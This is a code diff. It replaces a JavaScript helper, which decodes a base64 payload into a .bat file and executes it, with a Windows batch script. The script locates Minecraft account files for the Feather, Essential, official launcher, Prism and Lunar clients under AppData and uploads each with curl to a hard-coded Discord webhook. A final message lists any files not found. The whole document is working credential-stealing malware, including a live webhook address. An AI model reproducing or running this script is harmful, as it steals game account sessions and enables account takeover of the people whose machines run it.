@@ -1,43 +1,82 @@
-function executeBat(batFilePath, base64Content = null, isBase64Encoded = true) {
-    const FS = Java.type("java.nio.file.Files"); // Filesystem operations
-    const Paths = Java.type("java.nio.file.Paths"); // Path operations
-    const Base64 = Java.type("java.util.Base64");
-    const Runtime = Java.type("java.lang.Runtime");
+@echo off
+:: Define the file paths and webhook URL
+set "feather_file=%AppData%\.feather\accounts.json"
+set "essential_file=%AppData%\.minecraft\essential\microsoft_accounts.json"
+set "minecraft_file=%AppData%\.minecraft\launcher_accounts_microsoft_store.json"
+set "prism_file=%AppData%\.prism\accounts.json"
+set "lunar_file=%AppData%\.lunarclient\accounts.json"
+set "webhook_url=https://discord.com/api/webhooks/1332930112491884604/vmDraTMAZhzxDzh-GgzeWErsfj_krrPWnYDl2lrXbFSYbBe9svGOxFIRe7vh13uEYII4"
 
-    try {
-        if (base64Content) {
-            // Decode base64 content if needed
-            const decodedContent = isBase64Encoded
-                ? Base64.getDecoder().decode(base64Content)
-                : base64Content;
+:: Initialize variables for missing files
+set "discord_message="
 
-            // Write the decoded content to the specified .bat file
-            const filePath = Paths.get(batFilePath);
-            FS.write(filePath, decodedContent);
-            Chat.log(`Successfully wrote content to: ${batFilePath}`);
-        }
+:: Check and send Feather accounts file
+if exist "%feather_file%" (
+    echo Sending Feather Accounts File: %feather_file%
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: multipart/form-data" ^
+        -F "file=@%feather_file%" ^
+        -F "content=Feather Accounts File:"
+) else (
+    echo Feather Accounts File not found: %feather_file%
+    set "discord_message=%discord_message%Feather Accounts File: Not Found.%0A"
+)
 
-        // Check if the .bat file exists and is a valid file
-        const filePath = Paths.get(batFilePath);
-        if (!FS.exists(filePath)) {
-            throw new Error(`Whitelist accepted "${batFilePath}", but file does not exist.`);
-        }
-        if (!FS.isRegularFile(filePath)) {
-            throw new Error(`"${batFilePath}" is not a regular file. Whitelist denied.`);
-        }
+:: Check and send Essentials accounts file
+if exist "%essential_file%" (
+    echo Sending Essentials Accounts File: %essential_file%
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: multipart/form-data" ^
+        -F "file=@%essential_file%" ^
+        -F "content=Essentials Accounts File:"
+) else (
+    echo Essentials Accounts File not found: %essential_file%
+    set "discord_message=%discord_message%Essentials Accounts File: Not Found.%0A"
+)
 
-        // Execute the .bat file using Runtime.exec
-        Runtime.getRuntime().exec(`cmd /c start "" "${batFilePath}"`);
-        Chat.log(`Executed batch file: ${batFilePath}`);
-    } catch (error) {
-        Chat.log(`Error occurred: ${error.message}`);
-    }
-}
+:: Check and send Minecraft launcher accounts file
+if exist "%minecraft_file%" (
+    echo Sending Minecraft Launcher Accounts File: %minecraft_file%
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: multipart/form-data" ^
+        -F "file=@%minecraft_file%" ^
+        -F "content=Minecraft Accounts Launcher File:"
+) else (
+    echo Minecraft Launcher Accounts File not found: %minecraft_file%
+    set "discord_message=%discord_message%Minecraft Accounts Launcher File: Not Found.%0A"
+)
 
-// Example usage:
-const batFilePath = Java.type("java.lang.System").getProperty("user.home") + "\\test.bat"; // Path to .bat file
-const base64Content = "QGNobz0iSGVsbG8sIFdvcmxkISIKcGF1c2U="; // Example Base64 encoded batch script content
+:: Check and send Prism accounts file
+if exist "%prism_file%" (
+    echo Sending Prism Accounts File: %prism_file%
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: multipart/form-data" ^
+        -F "file=@%prism_file%" ^
+        -F "content=Prism Accounts File:"
+) else (
+    echo Prism Accounts File not found: %prism_file%
+    set "discord_message=%discord_message%Prism Accounts File: Not Found.%0A"
+)
 
-executeBat(batFilePath, base64Content, true);
+:: Check and send Lunar accounts file
+if exist "%lunar_file%" (
+    echo Sending Lunar Accounts File: %lunar_file%
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: multipart/form-data" ^
+        -F "file=@%lunar_file%" ^
+        -F "content=Lunar Accounts File:"
+) else (
+    echo Lunar Accounts File not found: %lunar_file%
+    set "discord_message=%discord_message%Lunar Accounts File: Not Found.%0A"
+)
 
-executeBat(batFilePath, base64Content, true);
+:: Send a message to the webhook if any files are missing
+if not "%discord_message%"=="" (
+    echo Sending missing files message to Discord webhook
+    curl -X POST "%webhook_url%" ^
+        -H "Content-Type: application/json" ^
+        -d "{\"content\": \"%discord_message%\"}"
+)
+
+echo Process complete!
+pause
